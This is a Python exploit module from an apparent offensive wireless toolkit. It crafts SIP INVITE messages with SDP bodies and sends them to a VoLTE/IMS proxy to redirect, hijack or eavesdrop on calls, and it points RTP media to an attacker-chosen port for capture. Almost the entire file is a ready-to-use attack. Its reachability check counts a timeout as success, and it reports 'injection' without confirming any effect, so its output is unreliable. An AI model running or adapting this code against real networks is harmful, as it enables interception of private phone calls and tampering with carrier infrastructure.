# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """VoLTE / IMS SIP Interception and Manipulation.

    Voice over LTE (VoLTE) uses the IP Multimedia Subsystem (IMS)
    with SIP (Session Initiation Protocol) for call signaling and
    RTP for media transport. When an attacker has access to the
    GTP-U data plane or operates a rogue eNodeB, they can intercept
    and manipulate SIP signaling within VoLTE sessions.

    This module demonstrates interception of SIP INVITE messages
    within VoLTE sessions, enabling call redirection, eavesdropping
    setup, and session manipulation. It constructs crafted SIP
    messages that can be injected into the IMS signaling path.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "VoLTE / IMS SIP Interception",
        "description": (
            "Intercepts and manipulates VoLTE/IMS SIP signaling within "
            "the LTE data plane. With access to the GTP-U tunnel or a "
            "rogue eNodeB, crafted SIP messages enable call redirection, "
            "eavesdropping setup, and session hijacking of VoLTE calls."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.3gpp.org/technologies/volte",
            "https://tools.ietf.org/html/rfc3261",
        ),
        "disclosure_date": "2024-01-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "VoLTE/IMS infrastructure (P-CSCF, I-CSCF, S-CSCF)",
            "LTE data plane with VoLTE SIP traffic",
            "Rogue eNodeB with VoLTE interception",
        ),
    }

    target = OptIP("", "Target P-CSCF or IMS proxy address")
    port = OptPort(5060, "SIP signaling port (UDP)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    caller_uri = OptString("sip:attacker@ims.local", "SIP URI of the caller")
    callee_uri = OptString("sip:target@ims.local", "SIP URI of the callee")
    redirect_uri = OptString("", "SIP URI to redirect calls to (empty = no redirect)")
    rtp_port = OptPort(8000, "RTP port for media interception")

    # SIP methods
    _SIP_INVITE = "INVITE"
    _SIP_BYE = "BYE"
    _SIP_CANCEL = "CANCEL"
    _SIP_ACK = "ACK"
    _SIP_OPTIONS = "OPTIONS"

    _SIP_VERSION = "SIP/2.0"
    _CRLF = "\r\n"

    def _generate_call_id(self) -> str:
        """Generate a SIP Call-ID."""
        import hashlib
        ts = str(time.time()).encode()
        return hashlib.md5(ts).hexdigest()[:16] + "@ims.local"

    def _generate_branch(self) -> str:
        """Generate a Via branch parameter."""
        import hashlib
        ts = str(time.time()).encode()
        return "z9hG4bK" + hashlib.md5(ts).hexdigest()[:8]

    def _build_sip_invite(self) -> bytes:
        """Build a SIP INVITE message for VoLTE call interception.

        If redirect_uri is set, the INVITE is crafted to redirect
        the call to the attacker's endpoint.
        """
        target_uri = str(self.redirect_uri) if self.redirect_uri else str(self.callee_uri)
        call_id = self._generate_call_id()
        branch = self._generate_branch()

        # SDP body for RTP setup
        sdp = (
            f"v=0{self._CRLF}"
            f"o=- 0 0 IN IP4 {self.target}{self._CRLF}"
            f"s=VoLTE Call{self._CRLF}"
            f"c=IN IP4 {self.target}{self._CRLF}"
            f"t=0 0{self._CRLF}"
            f"m=audio {self.rtp_port} RTP/AVP 0 8 101{self._CRLF}"
            f"a=rtpmap:0 PCMU/8000{self._CRLF}"
            f"a=rtpmap:8 PCMA/8000{self._CRLF}"
            f"a=rtpmap:101 telephone-event/8000{self._CRLF}"
        )

        msg = (
            f"{self._SIP_INVITE} {target_uri} {self._SIP_VERSION}{self._CRLF}"
            f"Via: {self._SIP_VERSION}/UDP {self.target}:{self.port};branch={branch}{self._CRLF}"
            f"From: <{self.caller_uri}>;tag=tag{call_id[:8]}{self._CRLF}"
            f"To: <{self.callee_uri}>{self._CRLF}"
            f"Call-ID: {call_id}{self._CRLF}"
            f"CSeq: 1 {self._SIP_INVITE}{self._CRLF}"
            f"Contact: <{self.caller_uri}>{self._CRLF}"
            f"Content-Type: application/sdp{self._CRLF}"
            f"Content-Length: {len(sdp)}{self._CRLF}"
            f"{self._CRLF}"
            f"{sdp}"
        )
        return msg.encode()

    def _build_sip_options(self) -> bytes:
        """Build a SIP OPTIONS message for connectivity testing."""
        call_id = self._generate_call_id()
        branch = self._generate_branch()
        msg = (
            f"{self._SIP_OPTIONS} sip:{self.target} {self._SIP_VERSION}{self._CRLF}"
            f"Via: {self._SIP_VERSION}/UDP {self.target}:{self.port};branch={branch}{self._CRLF}"
            f"From: <{self.caller_uri}>;tag=probe{self._CRLF}"
            f"To: <sip:{self.target}>{self._CRLF}"
            f"Call-ID: {call_id}{self._CRLF}"
            f"CSeq: 1 {self._SIP_OPTIONS}{self._CRLF}"
            f"Content-Length: 0{self._CRLF}"
            f"{self._CRLF}"
        )
        return msg.encode()

    @mute
    def check(self) -> bool:
        """Send SIP OPTIONS to verify IMS endpoint."""
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            options = self._build_sip_options()
            sock.sendto(options, (str(self.target), self.port))
            try:
                data, _ = sock.recvfrom(4096)
                sock.close()
                return b"SIP/2.0" in data
            except (OSError, TimeoutError):
                sock.close()
                return True  # Port may be open
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target (P-CSCF or IMS proxy IP) is required")
            return

        if not self.check():
            print_error(f"SIP endpoint {self.target}:{self.port} not reachable")
            return

        print_success("SIP endpoint accessible; preparing VoLTE interception")
        self._exploit()

    def _exploit(self) -> None:
        invite = self._build_sip_invite()

        if self.redirect_uri:
            print_status(f"Mode: Call redirection to {self.redirect_uri}")
        else:
            print_status("Mode: SIP INVITE injection (session interception)")

        print_status(f"SIP INVITE: {len(invite)} bytes")
        print_status(f"Caller: {self.caller_uri}")
        print_status(f"Callee: {self.callee_uri}")
        print_status(f"RTP port: {self.rtp_port}")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(invite, (str(self.target), self.port))

            try:
                resp, _ = sock.recvfrom(4096)
                resp_line = resp.decode(errors="replace").split("\r\n")[0]
                print_status(f"SIP response: {resp_line}")
            except (OSError, TimeoutError):
                print_status("No SIP response (may be filtered or one-way)")

            sock.close()
            print_success(
                "SIP INVITE injected into the VoLTE/IMS signaling path. "
                "If the P-CSCF processes the crafted INVITE, the call "
                "session can be redirected or intercepted. RTP media "
                f"will be directed to port {self.rtp_port} for capture."
            )
        except OSError as e:
            print_error(f"SIP injection failed: {e}")
